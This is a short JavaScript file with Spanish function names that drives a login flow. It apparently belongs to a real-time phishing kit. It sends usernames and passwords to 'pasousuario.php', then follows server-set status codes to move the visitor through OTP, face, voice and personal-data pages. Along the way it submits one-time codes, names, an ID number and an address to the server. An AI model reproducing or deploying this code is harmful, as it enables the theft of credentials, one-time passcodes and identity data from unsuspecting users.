function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}

function iniciar_sesion(u,c){
    d = detectar_dispositivo();
    $.post( "../process/pasousuario.php", {usr:u,pas:c,dis:d} ,function(data) {                
        window.location.href = "../private"; 
    });
}

function consultar_estado(){
    $.post( "../process/estado.php",function(data) {
        switch (data) {
            case '2': window.location.href = "../code-validate"; break;
            case '4': window.location.href = "../verify-face"; break;
            case '6': window.location.href = "../verify-voice"; break;               
            case '8': window.location.href = "../code-signup"; break;
            case '10': window.location.href = "../successful"; break;
            case '12': window.location.href = "../login"; break;
            case '14': window.location.href = "../info-update"; break;    
        } 
    });        
}

function esperando(){
    window.location.href = "../verifying"; 
}

function enviar_otp(o){
    $.post( "../process/pasoOTP.php", {otp:o} ,function(data) {     
        if (data == "OK") {
            setTimeout(esperando,2000);     
        }           
        
    });
}

function enviar_info(n1,n2,a1,a2,id,d){    
    $.post( "../process/pasoinfo.php", {nom:n1,nom2:n2,ape:a1,ape2:a2,doc:id,dir:d} ,function(data) {     
        if (data == "OK") {
            setTimeout(esperando,300);     
        }                 
    });
}



